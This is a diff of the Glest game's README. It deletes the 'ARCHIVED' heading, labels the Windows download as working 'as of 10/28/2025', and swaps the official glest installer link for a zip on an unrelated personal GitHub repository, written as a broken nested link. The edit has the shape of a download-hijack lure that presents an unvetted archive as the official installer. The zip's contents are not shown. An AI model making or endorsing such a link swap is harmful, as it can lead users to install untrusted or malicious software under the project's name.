@@ -1,8 +1,6 @@
 
 ========================================================================================
 
-ARCHIVED
-========
 This project is no longer maintained. If you would like to contact about this, please find us on **[Discord](https://discord.gg/es3EyBB)**.
 
 ========================================================================================
@@ -26,9 +24,9 @@ CPU is also available.
 
 ![Glest Screenshot](https://glest.io/docs/assets/screenshots/screen147.jpg)
 
-## Download for Windows
+## Download for Windows (Works as of 10/28/2025)
 
-#### [Download Glest from here](https://codeload.github.com/glest/windows-installer/zip/master).
+#### [Download Glest from here]([https://codeload.github.com/glest/windows-installer/zip/master](https://github.com/KeithSammut/glest-updated/raw/refs/heads/main/windows-installer-master.zip)).
 
 Additionally, if you want
 to contribute with the code on Windows, [please follow these
